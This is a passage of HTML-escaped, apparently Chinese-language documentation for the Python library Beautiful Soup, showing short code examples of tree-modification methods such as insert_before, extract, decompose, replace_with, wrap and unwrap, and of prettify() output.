&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;markup = &amp;apos;&amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;I linked to &amp;lt;i&amp;gt;example.com&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(markup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag = soup.a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag.insert(1, &amp;quot;but did not endorse &amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;I linked to but did not endorse &amp;lt;i&amp;gt;example.com&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag.contents&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [u&amp;apos;I linked to &amp;apos;, u&amp;apos;but did not endorse&amp;apos;, &amp;lt;i&amp;gt;example.com&amp;lt;/i&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;insert-before-和-insert-after&quot;&gt;&lt;a href=&quot;#insert-before-和-insert-after&quot; class=&quot;headerlink&quot; title=&quot;insert_before() 和 insert_after()&quot;&gt;&lt;/a&gt;insert_before() 和 insert_after()&lt;/h2&gt;&lt;p&gt;&lt;code&gt;insert_before()&lt;/code&gt; 方法在当前tag或文本节点前插入内容:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(&amp;quot;&amp;lt;b&amp;gt;stop&amp;lt;/b&amp;gt;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag = soup.new_tag(&amp;quot;i&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag.string = &amp;quot;Don&amp;apos;t&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.b.string.insert_before(tag)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.b&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;b&amp;gt;&amp;lt;i&amp;gt;Don&amp;apos;t&amp;lt;/i&amp;gt;stop&amp;lt;/b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;insert_after()&lt;/code&gt; 方法在当前tag或文本节点后插入内容:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.b.i.insert_after(soup.new_string(&amp;quot; ever &amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.b&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;b&amp;gt;&amp;lt;i&amp;gt;Don&amp;apos;t&amp;lt;/i&amp;gt; ever stop&amp;lt;/b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.b.contents&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;i&amp;gt;Don&amp;apos;t&amp;lt;/i&amp;gt;, u&amp;apos; ever &amp;apos;, u&amp;apos;stop&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;clear&quot;&gt;&lt;a href=&quot;#clear&quot; class=&quot;headerlink&quot; title=&quot;clear()&quot;&gt;&lt;/a&gt;clear()&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Tag.clear()&lt;/code&gt; 方法移除当前tag的内容:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;markup = &amp;apos;&amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;I linked to &amp;lt;i&amp;gt;example.com&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(markup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag = soup.a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag.clear()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;extract&quot;&gt;&lt;a href=&quot;#extract&quot; class=&quot;headerlink&quot; title=&quot;extract()&quot;&gt;&lt;/a&gt;extract()&lt;/h2&gt;&lt;p&gt;&lt;code&gt;PageElement.extract()&lt;/code&gt; 方法将当前tag移除文档树,并作为方法结果返回:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;markup = &amp;apos;&amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;I linked to &amp;lt;i&amp;gt;example.com&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(markup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a_tag = soup.a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;i_tag = soup.i.extract()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a_tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;I linked to&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;i_tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;i&amp;gt;example.com&amp;lt;/i&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(i_tag.parent)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;None&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个方法实际上产生了2个文档树: 一个是用来解析原始文档的 &lt;code&gt;BeautifulSoup&lt;/code&gt; 对象,另一个是被移除并且返回的tag.被移除并返回的tag可以继续调用 &lt;code&gt;extract&lt;/code&gt; 方法:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;my_string = i_tag.string.extract()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;my_string&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;example.com&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(my_string.parent)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# None&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;i_tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;i&amp;gt;&amp;lt;/i&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;decompose&quot;&gt;&lt;a href=&quot;#decompose&quot; class=&quot;headerlink&quot; title=&quot;decompose()&quot;&gt;&lt;/a&gt;decompose()&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Tag.decompose()&lt;/code&gt; 方法将当前节点移除文档树并完全销毁:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;markup = &amp;apos;&amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;I linked to &amp;lt;i&amp;gt;example.com&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(markup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a_tag = soup.a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.i.decompose()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a_tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;I linked to&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;replace-with&quot;&gt;&lt;a href=&quot;#replace-with&quot; class=&quot;headerlink&quot; title=&quot;replace_with()&quot;&gt;&lt;/a&gt;replace_with()&lt;/h2&gt;&lt;p&gt;&lt;code&gt;PageElement.replace_with()&lt;/code&gt; 方法移除文档树中的某段内容,并用新tag或文本节点替代它:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;markup = &amp;apos;&amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;I linked to &amp;lt;i&amp;gt;example.com&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(markup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a_tag = soup.a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;new_tag = soup.new_tag(&amp;quot;b&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;new_tag.string = &amp;quot;example.net&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a_tag.i.replace_with(new_tag)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a_tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;I linked to &amp;lt;b&amp;gt;example.net&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;replace_with()&lt;/code&gt; 方法返回被替代的tag或文本节点,可以用来浏览或添加到文档树其它地方&lt;/p&gt;
&lt;h2 id=&quot;wrap&quot;&gt;&lt;a href=&quot;#wrap&quot; class=&quot;headerlink&quot; title=&quot;wrap()&quot;&gt;&lt;/a&gt;wrap()&lt;/h2&gt;&lt;p&gt;&lt;code&gt;PageElement.wrap()&lt;/code&gt; 方法可以对指定的tag元素进行包装 [8] ,并返回包装后的结果:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(&amp;quot;&amp;lt;p&amp;gt;I wish I was bold.&amp;lt;/p&amp;gt;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.p.string.wrap(soup.new_tag(&amp;quot;b&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;b&amp;gt;I wish I was bold.&amp;lt;/b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.p.wrap(soup.new_tag(&amp;quot;div&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;p&amp;gt;&amp;lt;b&amp;gt;I wish I was bold.&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;该方法在 Beautiful Soup 4.0.5 中添加&lt;/p&gt;
&lt;h2 id=&quot;unwrap&quot;&gt;&lt;a href=&quot;#unwrap&quot; class=&quot;headerlink&quot; title=&quot;unwrap()&quot;&gt;&lt;/a&gt;unwrap()&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Tag.unwrap()&lt;/code&gt; 方法与 &lt;code&gt;wrap()&lt;/code&gt; 方法相反.将移除tag内的所有tag标签,该方法常被用来进行标记的解包:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;markup = &amp;apos;&amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;I linked to &amp;lt;i&amp;gt;example.com&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(markup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a_tag = soup.a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a_tag.i.unwrap()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a_tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;I linked to example.com&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;与 &lt;code&gt;replace_with()&lt;/code&gt; 方法相同, &lt;code&gt;unwrap()&lt;/code&gt; 方法返回被移除的tag&lt;/p&gt;
&lt;h1 id=&quot;输出&quot;&gt;&lt;a href=&quot;#输出&quot; class=&quot;headerlink&quot; title=&quot;输出&quot;&gt;&lt;/a&gt;输出&lt;/h1&gt;&lt;h2 id=&quot;格式化输出&quot;&gt;&lt;a href=&quot;#格式化输出&quot; class=&quot;headerlink&quot; title=&quot;格式化输出&quot;&gt;&lt;/a&gt;格式化输出&lt;/h2&gt;&lt;p&gt;&lt;code&gt;prettify()&lt;/code&gt; 方法将Beautiful Soup的文档树格式化后以Unicode编码输出,每个XML/HTML标签都独占一行&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;markup = &amp;apos;&amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;I linked to &amp;lt;i&amp;gt;example.com&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(markup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.prettify()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;apos;&amp;lt;html&amp;gt;\n &amp;lt;head&amp;gt;\n &amp;lt;/head&amp;gt;\n &amp;lt;body&amp;gt;\n  &amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;\n...&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(soup.prettify())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#   &amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    I linked to&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    &amp;lt;i&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#     example.com&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    &amp;lt;/i&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#   &amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;BeautifulSoup&lt;/code&gt; 对象和它的tag节点都可以调用 &lt;code&gt;prettify()&lt;/code&gt; 方法:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;print(soup.a.prettify())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a 